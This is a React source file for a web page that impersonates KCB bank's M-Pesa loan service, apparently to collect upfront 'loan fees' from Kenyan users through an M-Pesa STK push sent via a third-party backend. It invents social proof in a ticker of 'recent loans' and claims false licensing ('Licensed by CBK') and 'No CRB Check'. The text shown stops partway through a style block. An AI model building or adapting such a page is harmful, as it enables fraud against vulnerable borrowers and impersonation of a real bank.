"use client";
import { useState, useEffect, useRef } from "react";

import {
  FaBolt,
  FaMobileAlt,
  FaShieldAlt,
  FaUser,
  FaStar,
  FaMoneyBillWave,
  FaFileAlt,
  FaCheckCircle,
  FaLock
} from "react-icons/fa";
/* ═══════════════════════════════════════════════════════════════
   KCB LOANS KENYA — exact screenshot match
   Landing → Eligibility Form → Loan Grid → Confirm Modal →
   STK Push → Verifying Payment → Success
   Real M-Pesa: starlink-backend-yb3n.onrender.com
═══════════════════════════════════════════════════════════════ */

const MPESA_BASE = "https://payhero-backend-m78g.onrender.com";

/* ── Loan packages (amount, fee, repayment = amount + fee + interest) ── */
const LOAN_GROUPS = [
  {
    title: "Personal Loan Loans",
    items: [
      { amount: 4000, fee: 199 },
      { amount: 8000, fee: 213 },
      { amount: 11000, fee: 293 },
      { amount: 15000, fee: 449 },
      { amount: 23000, fee: 612 },
      { amount: 30000, fee: 799 },
      { amount: 45000, fee: 1197 },
    ],
  },
  {
    title: "Business Loan Loans",
    items: [
      { amount: 13000, fee: 346 },
      { amount: 25000, fee: 649 },
      { amount: 38000, fee: 1011 },
      { amount: 50000, fee: 1299 },
      { amount: 75000, fee: 1799 },
      { amount: 100000, fee: 2499 },
      { amount: 150000, fee: 3990 },
    ],
  },
  {
    title: "Education Loan Loans",
    items: [
      { amount: 5000, fee: 199 },
      { amount: 10000, fee: 349 },
      { amount: 15000, fee: 449 },
      { amount: 20000, fee: 549 },
      { amount: 30000, fee: 799 },
      { amount: 40000, fee: 999 },
      { amount: 60000, fee: 1596 },
    ],
  },
  {
    title: "Emergency Loan Loans",
    items: [
      { amount: 3000, fee: 80 },
      { amount: 5000, fee: 199 },
      { amount: 8000, fee: 213 },
      { amount: 10000, fee: 349 },
      { amount: 15000, fee: 449 },
      { amount: 20000, fee: 549 },
      { amount: 30000, fee: 799 },
    ],
  },
  {
    title: "Home Improvement Loans",
    items: [
      { amount: 25000, fee: 649 },
      { amount: 50000, fee: 1299 },
      { amount: 75000, fee: 1799 },
      { amount: 100000, fee: 2499 },
      { amount: 150000, fee: 3990 },
      { amount: 200000, fee: 5320 },
      { amount: 300000, fee: 7980 },
    ],
  },
];


const SECURITY = [
  { icon: FaLock, label: "SSL Secured" },
  { icon: FaShieldAlt, label: "Data Protected" },
  { icon: FaUser, label: "No CRB Check" },
  { icon: FaStar, label: "Licensed Program" },
];

const LOAN_TYPES = [
  "Personal Loan",
  "Business Loan",
  "Emergency Loan",
  "School Fees Loan",
  "Agricultural Loan",
  "Asset Finance",
];

/* ── phone helpers ── */
function normalisePhone(raw) {
  const p = raw.replace(/\D/g, "");
  if (p.startsWith("07") || p.startsWith("01")) return "254" + p.slice(1);
  if (p.startsWith("254")) return p;
  return null;
}
function isValidPhone(raw) {
  const p = raw.replace(/\D/g, "");
  return /^(07\d{8}|01\d{8}|2547\d{8}|2541\d{8})$/.test(p);
}
function fmt(n) {
  return Number(n).toLocaleString("en-KE");
}
function maskPhone(p) {
  const d = p.replace(/\D/g, "");
  if (d.startsWith("254")) return "254" + d.slice(3, 6) + "***" + d.slice(-3);
  return d.slice(0, 4) + "***" + d.slice(-3);
}

/* ── Recent loan ticker data ── */
const RECENT = [
  "0727****01 loaned Ksh 22,500 – 7 mins ago",
  "0712****45 loaned Ksh 16,800 – 12 mins ago",
  "0745****88 loaned Ksh 9,800 – 18 mins ago",
  "0711****32 loaned Ksh 48,600 – 22 mins ago",
  "0790****56 loaned Ksh 30,000 – 31 mins ago",
  "0722****19 loaned Ksh 11,200 – 35 mins ago",
  "0768****74 loaned Ksh 35,400 – 44 mins ago",
  "0733****63 loaned Ksh 25,600 – 51 mins ago",
];

/* ══════════════════════════════════════════════════════════════
   CSS — exact match to screenshots
══════════════════════════════════════════════════════════════ */
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:16px;-webkit-text-size-adjust:100%}
body{font-family:'Inter',sans-serif;background:#f0f7f0;color:#1a1a1a;overflow-x:hidden;min-height:100vh;-webkit-font-smoothing:antialiased}
input,select,button,textarea{font-family:inherit}
input::placeholder{color:#b0b8b0}
::-webkit-scrollbar{width:3px}::-webkit-scrollbar-thumb{background:#c8dfc8;border-radius:2px}

/* ── APP SHELL ── */
.app{max-width:900px;margin:0 auto;min-height:100%;background:#f0f7f0;position:relative;overflow-x:hidden}




.hero-wrap{
  display:flex;
  gap:20px;
  padding:24px 20px;
  align-items:center;
  justify-content:space-between;
}

.hero-left{
  flex:1;
}

.hero-title{
  font-size:26px;
  font-weight:800;
  color:#1f3b73;
  line-height:1.2;
}

.hero-title span{
  color:#dc2626;
}

.hero-desc{
  font-size:13px;
  color:#6b7280;
  margin:10px 0 14px;
}

.hero-steps{
  display:flex;
  gap:10px;
  font-size:12px;
  color:#374151;
  margin-bottom:14px;
}

.hero-steps div{
  display:flex;
  align-items:center;
  gap:6px;
}

.hero-circle{
  width:20px;
  height:20px;
  border-radius:50%;
  background:#1f3b73;
  color:#fff;
  font-size:11px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.hero-btn{
  background:#dc2626;
  color:#fff;
  border:none;
  padding:12px 16px;
  border-radius:8px;
  font-weight:700;
  cursor:pointer;
}

.hero-right{
  flex:1;
  max-width:360px;
}

.hero-img{
  width:100%;
  height:auto;
  border-radius:16px;
}

.hero-stats{
  position:absolute;
  bottom:10px;
  left:10px;
  right:10px;
  background:#fff;
  border-radius:12px;
  display:flex;
  justify-content:space-between;
  padding:10px;
  font-size:12px;
  box-shadow:0 4px 10px rgba(0,0,0,0.1);
}

.hero-stat strong{
  display:block;
  font-size:14px;
}










:root {
  --primary-blue: #1e3a8a;
  --light-blue: #eaf1fb;
  --danger-red: #dc2626;
  --accent-orange: #f59e0b;
  --success-green: #22c55e;
  --bg-main: #f8fafc;
}

/* ── TOP BAR ── */
.topbar{background:linear-gradient(135deg,#1a7a3a,#2d9e52);padding:16px 20px 14px;display:flex;align-items:center;justify-content:space-between}
.logo-pill{background:#fff;border-radius:12px;padding:8px 18px;display:inline-block}
.logo-text{font-size:1.3rem;font-weight:800;color:#1a7a3a;letter-spacing:-.3px}
.logo-reg{font-size:9px;vertical-align:super;color:#1a7a3a}
.topbar-tag{background:rgba(255,255,255,.18);border-radius:99px;padding:6px 14px;font-size:12px;font-weight:600;color:#fff;display:flex;align-items:center;gap:5px}

/* ── HERO CARD ── */
.hero-card{margin:16px;background:#fff;border-radius:20px;padding:28px 24px;box-shadow:0 4px 24px rgba(26,122,58,.10)}
.hero-avail{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:#9aaa9a;text-align:center;margin-bottom:8px}
.hero-amount{font-size:2.6rem;font-weight:800;color:#1a7a3a;text-align:center;line-height:1.1;margin-bottom:6px}
.hero-dash{color:#333;font-weight:700}
.hero-sub{text-align:center;font-size:13px;color:#6b7b6b;margin-bottom:22px;line-height:1.5}
.features-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:0}
.feat-box{background:#edf7ef;border-radius:14px;padding:18px 14px;display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
.feat-icon{font-size:26px;color:#1a7a3a}
.feat-label{font-size:12px;font-weight:700;color:#2a3a2a}

/* ── TRUST BADGES ── */
.trust-row{display:flex;gap:8px;flex-wrap:wrap;padding:0 16px;margin-bottom:8px;justify-content:center}
.trust-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;box-shadow:0 2px 8px rgba(0,0,0,.06);border:1px solid #d8edd8}

/* ── TICKER ── */
.ticker-wrap{background:#edf7ef;border-radius:12px;margin:10px 16px;padding:10px 14px;display:flex;align-items:center;gap:8px;overflow:hidden}
.ticker-icon{font-size:14px;flex-shrink:0;color:#1a7a3a}
.ticker-text{font-size:12px;font-weight:600;color:#2a5a2a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* ── BTN PRIMARY ── */
.btn-primary{display:block;width:calc(100% - 32px);margin:14px 16px;padding:18px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 6px 20px rgba(26,122,58,.3)}
.btn-primary:hover{background:linear-gradient(135deg,#145f2e,#248042);transform:translateY(-1px)}
.btn-primary:active{transform:translateY(0)}
.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-primary-fixed{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;padding:18px 24px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 -4px 24px rgba(26,122,58,.2);z-index:20}
.btn-primary-fixed:disabled{opacity:.5;cursor:not-allowed}

/* ── FORM ── */
.form-wrap{margin:0 16px;background:#fff;border-radius:20px;padding:24px;box-shadow:0 4px 20px rgba(26,122,58,.08)}
.form-title{font-size:1.35rem;font-weight:800;color:#1a1a1a;text-align:center;margin-bottom:4px;line-height:1.25}
.form-sub{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:4px}
.form-range{font-size:15px;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:22px}
.finp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s,box-shadow .18s;margin-bottom:12px}
.finp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.finp.err{border-color:#e53935}
.fsel{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%231a7a3a' stroke-width='2'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:40px;transition:border-color .18s;margin-bottom:12px}
.fsel:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.ferr{font-size:11px;color:#e53935;margin:-8px 0 10px 4px}
.finp-hint{font-size:11px;color:#9aaa9a;margin:-8px 0 10px 4px}
.trust-mini{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px;justify-content:center}
.trust-mini-pill{background:#edf7ef;border-radius:99px;padding:5px 12px;font-size:10px;font-weight:600;color:#2a5a2a;display:flex;align-items:center;gap:4px;border:1px solid #c8e4c8}
.form-bottom-note{font-size:12px;color:#9aaa9a;text-align:center;margin-top:4px}





.loader-circle {
  width: 70px;
  height: 70px;
  border: 6px solid rgba(255,255,255,0.2);
  border-top-color: #22c55e;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ── LOAN GRID ── */
.screen-title{font-size:1.15rem;font-weight:800;color:#1a7a3a;text-align:center;margin:16px 0 12px;padding:0 16px}
.loan-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 16px;margin-bottom:90px}
.loan-card{background:#fff;border:1.5px solid #e8f4e8;border-radius:16px;padding:18px 14px;cursor:pointer;transition:all .18s;display:flex;flex-direction:column;align-items:flex-start;gap:3px;position:relative;overflow:hidden}
.loan-card:hover{border-color:#1a7a3a;transform:translateY(-2px);box-shadow:0 8px 24px rgba(26,122,58,.14)}
.loan-card.selected{border-color:#1a7a3a;background:#edf7ef;box-shadow:0 6px 20px rgba(26,122,58,.18)}
.loan-card.selected::before{content:'✓';position:absolute;top:8px;right:10px;font-size:13px;font-weight:800;color:#1a7a3a}
.loan-amount{font-size:1.15rem;font-weight:800;color:#1a7a3a}
.loan-fee{font-size:12px;color:#7a8a7a;font-weight:500}

/* ── MODAL OVERLAY ── */
.modal-bg{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.45);backdrop-filter:blur(3px);display:flex;align-items:flex-end;justify-content:center;padding:0;animation:bgIn .25s ease}
@media(min-width:480px){.modal-bg{align-items:center;padding:20px}}
@keyframes bgIn{from{opacity:0}to{opacity:1}}
.modal-box{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:480px;padding:28px 24px 36px;animation:slideUp .3s cubic-bezier(.34,1.2,.64,1)}
@media(min-width:480px){.modal-box{border-radius:24px}}
@keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:none;opacity:1}}
.modal-icon{width:72px;height:72px;border-radius:50%;background:#edf7ef;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px}
.modal-icon.doc{background:#edf7ef}
.modal-icon.phone{background:#edf7ef}
.modal-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:20px}
.modal-details{background:#f8faf8;border-radius:14px;padding:16px;margin-bottom:16px}
.modal-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #eef4ee}
.modal-row:last-child{border-bottom:none}
.modal-row-key{font-size:13px;color:#7a8a7a;font-weight:500}
.modal-row-val{font-size:14px;font-weight:700;color:#1a1a1a}
.modal-row-val.green{color:#1a7a3a}
.modal-phone-line{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:6px}
.modal-phone-num{font-size:16px;font-weight:700;color:#1a7a3a;text-align:center;margin-bottom:20px}
.btn-proceed{width:100%;padding:17px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:12px;transition:all .2s;box-shadow:0 4px 16px rgba(26,122,58,.25)}
.btn-proceed:hover{background:linear-gradient(135deg,#145f2e,#248042)}
.btn-proceed:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-cancel{width:100%;padding:15px;border-radius:14px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}
.btn-cancel:hover{border-color:#1a7a3a;color:#1a7a3a}

/* ── STK SCREEN ── */
.stk-modal-icon{font-size:58px;margin-bottom:6px}
.stk-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:14px}
.stk-phone-box{background:#f0f7f0;border-radius:10px;padding:10px 16px;text-align:center;margin-bottom:20px;font-size:14px;color:#2a5a2a;font-weight:600}
.stk-verifying{text-align:center;font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
.stk-dots{display:inline-block;min-width:20px;text-align:left}
.stk-bar-wrap{height:5px;background:#e0ece0;border-radius:99px;margin:16px 0;overflow:hidden}
.stk-bar-fill{height:100%;background:linear-gradient(90deg,#1a7a3a,#4ade80);border-radius:99px;animation:stk-progress 20s linear forwards}
@keyframes stk-progress{from{width:0%}to{width:95%}}
.stk-note{font-size:12px;color:#9aaa9a;text-align:center;line-height:1.6}
.stk-manual{margin-top:16px;background:none;border:none;cursor:pointer;font-size:12px;color:#9aaa9a;text-decoration:underline;display:block;margin:14px auto 0}

/* ── SUCCESS ── */
.success-wrap{padding:32px 24px;text-align:center}
.success-icon{font-size:72px;margin-bottom:16px;animation:popIn .5s cubic-bezier(.34,1.56,.64,1)}
@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
.success-title{font-size:1.5rem;font-weight:800;color:#1a7a3a;margin-bottom:8px}
.success-sub{font-size:14px;color:#6b7b6b;line-height:1.7;max-width:300px;margin:0 auto 24px}
.success-amount-box{background:#edf7ef;border:1.5px solid #a8d4a8;border-radius:16px;padding:20px;margin-bottom:20px}
.success-amount{font-size:2rem;font-weight:800;color:#1a7a3a}
.success-amount-sub{font-size:13px;color:#6b7b6b;margin-top:4px}
.success-details{text-align:left;background:#f8faf8;border-radius:14px;padding:16px}
.srow{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #eef4ee;font-size:13px}
.srow:last-child{border-bottom:none}
.srow-k{color:#9aaa9a;font-weight:500}
.srow-v{color:#1a1a1a;font-weight:700}

/* ── TIMEOUT ── */
.timeout-wrap{text-align:center;padding:8px 0}
.timeout-ico{font-size:52px;margin-bottom:12px}
.timeout-t{font-size:1.1rem;font-weight:800;color:#1a1a1a;margin-bottom:8px}
.timeout-s{font-size:13px;color:#7a8a7a;line-height:1.65;margin-bottom:20px}
.btn-yes{width:100%;padding:15px;border-radius:12px;border:none;background:#1a7a3a;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px}
.btn-no{width:100%;padding:15px;border-radius:12px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:14px;font-weight:600;cursor:pointer}

/* ── SECURITY STRIP ── */
.security-strip{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;padding:10px 16px 20px}
.sec-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;border:1px solid #d8edd8;box-shadow:0 1px 4px rgba(0,0,0,.05)}

/* ── SPINNER ── */
.spin{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .65s linear infinite;display:inline-block}
@keyframes sp{to{transform:rotate(360deg)}}

/* ── PHONE INPUT ── */
.phone-modal-wrap{margin-bottom:14px}
.phone-modal-inp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:14px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s;text-align:center;letter-spacing:.04em}
.phone-modal-inp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.phone-modal-inp.err{border-color:#e53935}
.phone-err{font-size:11px;color:#e53935;text-align:center;margin-top:4px}
.phone-hint{font-size:11px;color:#9aaa9a;text-align:center;margin-top:4px}
`;

/* ══════════════════════════════════════════════════════════════
   COMPONENTS
══════════════════════════════════════════════════════════════ */

/* Animated ticker */
function Ticker({ items }) {
  const [idx, setIdx] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setIdx(i => (i + 1) % items.length), 4000);
    return () => clearInterval(iv);
  }, [items.length]);
  return (
    <div className="ticker-wrap">
      <span className="ticker-icon">...</span>
      <span className="ticker-text">{items[idx]}</span>
    </div>
  );
}


/* ── SCREEN 1: HERO ── */
/* ── SCREEN 1: HERO ── */

function ShieldIcon() {
  return (
    <svg
      width="30"
      height="30"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
    >
      <path d="M12 3 5 6v5c0 4.7 2.9 8.6 7 10 4.1-1.4 7-5.3 7-10V6l-7-3Z" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg
      width="30"
      height="30"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
    >
      <rect x="5" y="10" width="14" height="11" rx="2" />
      <path d="M8 10V7a4 4 0 0 1 8 0v3" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg
      width="30"
      height="30"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.8"
    >
      <circle cx="12" cy="12" r="9" />
      <path d="m8 12 2.5 2.5L16 9" />
    </svg>
  );
}

function HeroScreen({ onStart }) {
  const steps = ["Apply", "Approve", "Receive"];

  const features = [
    {
      title: "Quick Approval",
      description:
        "Get pre-approved in minutes with our streamlined digital process.",
      icon: <ShieldIcon />,
    },
    {
      title: "Flexible Terms",
      description:
        "Choose loan terms from 30 to 90 days that fit your budget.",
      icon: <LockIcon />,
    },
    {
      title: "No Hidden Fees",
      description:
        "Transparent pricing with no surprises. Know exactly what you'll pay.",
      icon: <CheckIcon />,
    },
  ];

  return (
    <div className="kcb-page">
      {/* ───────────────── HEADER ───────────────── */}
      <header className="kcb-header">
        <div className="kcb-header-brand">
          <img
            src="/kcb-hero.png"
            alt="KCB"
            className="kcb-header-logo"
          />

          <span className="kcb-header-title">
            M-PESA Loans
          </span>
        </div>

        <button className="kcb-help">
          Help
        </button>
      </header>

      {/* ───────────────── MAIN ───────────────── */}
      <main>

        {/* HERO */}
        <section className="kcb-hero-section">
          <div className="kcb-hero-inner">

            {/* LEFT SIDE */}
            <div className="kcb-hero-copy">

              <h1 className="kcb-heading">
                Get Up To{" "}
                <span>Ksh 100,000</span>
              </h1>

              <p className="kcb-subheading">
                Low 5.5% interest rate for qualified borrowers
              </p>

              {/* STEPS */}
              <div className="kcb-steps">
                {steps.map((step, index) => (
                  <div className="kcb-step" key={step}>
                    <div className="kcb-step-number">
                      {index + 1}
                    </div>

                    <span>{step}</span>
                  </div>
                ))}
              </div>

              {/* CTA */}
              <button
                type="button"
                className="kcb-apply-button"
                onClick={onStart}
              >
                Apply Now
              </button>
            </div>

            {/* RIGHT SIDE */}
            <div className="kcb-hero-visual">

              <img
                src="/kcb-hero.png"
                alt="KCB M-PESA Loans"
                className="kcb-hero-image"
              />

              {/* FLOATING INFO CARD */}
              <div className="kcb-floating-card">

                <div className="kcb-floating-item">
                  <strong>Ksh 100K</strong>
                  <span>Max Amount</span>
                </div>

                <div className="kcb-floating-divider" />

                <div className="kcb-floating-item">
                  <strong className="red">
                    5.5%
                  </strong>
                  <span>Interest</span>
                </div>

                <div className="kcb-floating-divider" />

                <div className="kcb-floating-item">
                  <strong className="green">
                    3 Steps
                  </strong>
                  <span>Process</span>
                </div>

              </div>
            </div>

          </div>
        </section>

        {/* ───────────────── FEATURES ───────────────── */}
        <section className="kcb-features-section">
          <div className="kcb-features">

            {features.map((feature) => (
              <div
                className="kcb-feature-card"
                key={feature.title}
              >
                <div className="kcb-feature-icon">
                  {feature.icon}
                </div>

                <h3>
                  {feature.title}
                </h3>

                <p>
                  {feature.description}
                </p>
              </div>
            ))}

          </div>
        </section>

        {/* ───────────────── SECURITY ROW ───────────────── */}
        <section className="kcb-security-section">

          <div className="kcb-security-item">
            <span className="kcb-security-icon">
              <ShieldIcon />
            </span>
            <span>Secure</span>
          </div>

          <div className="kcb-security-item">
            <span className="kcb-security-icon">
              <CheckIcon />
            </span>
            <span>Licensed</span>
          </div>

          <div className="kcb-security-item">
            <span className="kcb-security-icon">
              <LockIcon />
            </span>
            <span>Encrypted</span>
          </div>

        </section>

      </main>

      {/* ───────────────── FOOTER ───────────────── */}
      <footer className="kcb-footer">

        <div className="kcb-footer-inner">

          {/* BRAND */}
          <div className="kcb-footer-brand">
            <img
              src="/kcb-logo.png"
              alt="KCB"
              className="kcb-footer-logo"
            />

            <span>
              KCB M-PESA Loans
            </span>
          </div>

          {/* LINKS */}
          <nav className="kcb-footer-links">
            <button>Privacy</button>
            <button>Terms</button>
            <button>Contact</button>
          </nav>

          {/* COPYRIGHT */}
          <div className="kcb-footer-copy">
            © 2026 KCB M-PESA Loans Kenya. Licensed by CBK.
          </div>

        </div>

      </footer>

      {/* ───────────────── STYLES ───────────────── */}
      <style>{`

        * {
          box-sizing: border-box;
        }

        .kcb-page {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          background: #f8fafc;
          color: #172b4d;
          font-family:
            Inter,
            -apple-system,
            BlinkMacSystemFont,
            "Segoe UI",
            Roboto,
            Arial,
            sans-serif;
        }

        /* HEADER */

        .kcb-header {
          height: 82px;
          padding: 0 32px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          background: #ffffff;
          border-bottom: 1px solid #e5e7eb;
        }

        .kcb-header-brand {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .kcb-header-logo {
          width: 48px;
          height: 48px;
          object-fit: contain;
          display: block;
        }

        .kcb-header-title {
          color: #172b4d;
          font-size: 16px;
          font-weight: 500;
        }

        .kcb-help {
          border: 0;
          background: transparent;
          color: #172b4d;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          padding: 8px 0;
        }

        /* HERO */

        .kcb-hero-section {
          background: #ffffff;
        }

        .kcb-hero-inner {
          max-width: 1100px;
          min-height: 665px;
          margin: 0 auto;
          padding: 82px 32px 90px;

          display: grid;
          grid-template-columns: 1fr 1fr;
          align-items: center;
          gap: 60px;
        }

        .kcb-hero-copy {
          max-width: 500px;
        }

        .kcb-heading {
          margin: 0;
          color: #1e4178;
          font-size: 51px;
          line-height: 1.08;
          letter-spacing: -1.5px;
          font-weight: 800;
        }

        .kcb-heading span {
          color: #ed1c24;
        }

        .kcb-subheading {
          margin: 22px 0 0;
          color: #53657d;
          font-size: 18px;
          line-height: 1.5;
          font-weight: 400;
        }

        /* STEPS */

        .kcb-steps {
          display: flex;
          align-items: center;
          gap: 28px;
          margin-top: 28px;
          margin-bottom: 31px;
        }

        .kcb-step {
          display: flex;
          align-items: center;
          gap: 9px;
          color: #172b4d;
          font-size: 16px;
          font-weight: 500;
        }

        .kcb-step-number {
          width: 34px;
          height: 34px;
          flex-shrink: 0;

          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;

          color: #ffffff;
          background: #1e4178;

          font-size: 14px;
          font-weight: 600;
        }

        /* BUTTON */

        .kcb-apply-button {
          height: 51px;
          padding: 0 32px;

          border: none;
          border-radius: 8px;

          background: #ed1c24;
          color: #ffffff;

          font-size: 16px;
          font-weight: 700;

          cursor: pointer;

          transition:
            background 0.2s ease,
            transform 0.15s ease,
            box-shadow 0.2s ease;
        }

        .kcb-apply-button:hover {
          background: #d91820;
          box-shadow: 0 5px 15px rgba(237, 28, 36, 0.22);
        }

        .kcb-apply-button:active {
          transform: translateY(1px);
        }

        /* HERO IMAGE */

        .kcb-hero-visual {
          position: relative;
          width: 100%;
          max-width: 510px;
          margin-left: auto;
          padding-bottom: 22px;
        }

        .kcb-hero-image {
          display: block;
          width: 100%;
          height: auto;
          border-radius: 17px;
          object-fit: cover;

          box-shadow:
            0 18px 32px rgba(0, 0, 0, 0.13);
        }

        /* FLOAT CARD */

        .kcb-floating-card {
          position: absolute;

          left: 16px;
          right: 16px;
          bottom: 0;

          min-height: 82px;
          padding: 12px 22px;

          display: flex;
          align-items: center;
          justify-content: space-around;

          background: rgba(255, 255, 255, 0.96);
          border-radius: 13px;

          box-shadow:
            0 8px 25px rgba(0, 0, 0, 0.12);

          backdrop-filter: blur(5px);
        }

        .kcb-floating-item {
          flex: 1;
          text-align: center;

          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 4px;
        }

        .kcb-floating-item strong {
          color: #1e4178;
          font-size: 23px;
          line-height: 1;
          font-weight: 800;
        }

        .kcb-floating-item strong.red {
          color: #ed1c24;
        }

        .kcb-floating-item strong.green {
          color: #159447;
        }

        .kcb-floating-item span {
          color: #697586;
          font-size: 12px;
          line-height: 1.2;
        }

        .kcb-floating-divider {
          width: 1px;
          height: 54px;
          background: #e5e7eb;
        }

        /* FEATURES */

        .kcb-features-section {
          background: #f7f8fa;
          padding: 66px 32px;
        }

        .kcb-features {
          max-width: 1100px;
          margin: 0 auto;

          display: grid;
          grid-template-columns:
            repeat(3, minmax(0, 1fr));
          gap: 32px;
        }

        .kcb-feature-card {
          min-height: 243px;
          padding: 25px 28px;

          display: flex;
          flex-direction: column;
          align-items: center;
          text-align: center;

          background: #ffffff;
          border-radius: 13px;

          box-shadow:
            0 2px 10px rgba(0, 0, 0, 0.045);
        }

        .kcb-feature-icon {
          width: 66px;
          height: 66px;

          margin-bottom: 17px;

          display: flex;
          align-items: center;
          justify-content: center;

          border-radius: 50%;
          background: #e1edff;
          color: #1e4d87;
        }

        .kcb-feature-card h3 {
          margin: 0;
          color: #123e75;
          font-size: 20px;
          line-height: 1.25;
          font-weight: 700;
        }

        .kcb-feature-card p {
          max-width: 280px;
          margin: 13px 0 0;

          color: #53657d;
          font-size: 16px;
          line-height: 1.5;
        }

        /* SECURITY */

        .kcb-security-section {
          min-height: 156px;
          padding: 30px 32px;

          display: flex;
          align-items: center;
          justify-content: center;
          gap: 55px;

          background: #ffffff;
        }

        .kcb-security-item {
          display: flex;
          align-items: center;
          gap: 10px;

          color: #172b4d;
          font-size: 16px;
          font-weight: 500;
        }

        .kcb-security-icon {
          display: flex;
          color: #0ca54b;
        }

        .kcb-security-icon svg {
          width: 23px;
          height: 23px;
        }

        /* FOOTER */

        .kcb-footer {
          margin-top: auto;
          background: #1e4178;
          border-top: 3px solid #153764;
          color: #ffffff;
        }

        .kcb-footer-inner {
          max-width: 1100px;
          min-height: 82px;
          margin: 0 auto;
          padding: 0 32px;

          display: grid;
          grid-template-columns: 1fr auto 1fr;
          align-items: center;
          gap: 30px;
        }

        .kcb-footer-brand {
          display: flex;
          align-items: center;
          gap: 10px;

          font-size: 14px;
          font-weight: 500;
        }

        .kcb-footer-logo {
          width: 43px;
          height: 43px;
          object-fit: contain;
        }

        .kcb-footer-links {
          display: flex;
          align-items: center;
          gap: 27px;
        }

        .kcb-footer-links button {
          border: none;
          padding: 0;
          background: transparent;

          color: #ffffff;
          font-size: 14px;
          cursor: pointer;
        }

        .kcb-footer-copy {
          justify-self: end;
          color: #9bc4ff;
          font-size: 14px;
          white-space: nowrap;
        }

        /* ───────────── RESPONSIVE ───────────── */

        @media (max-width: 900px) {

          .kcb-hero-inner {
            grid-template-columns: 1fr;
            padding-top: 55px;
            padding-bottom: 75px;
            gap: 55px;
          }

          .kcb-hero-copy {
            max-width: 650px;
          }

          .kcb-hero-visual {
            max-width: 600px;
            margin: 0 auto;
          }

          .kcb-features {
            grid-template-columns: 1fr;
            max-width: 550px;
          }

          .kcb-footer-inner {
            grid-template-columns: 1fr;
            justify-items: center;
            padding-top: 24px;
            padding-bottom: 24px;
            gap: 20px;
          }

          .kcb-footer-copy {
            justify-self: center;
          }
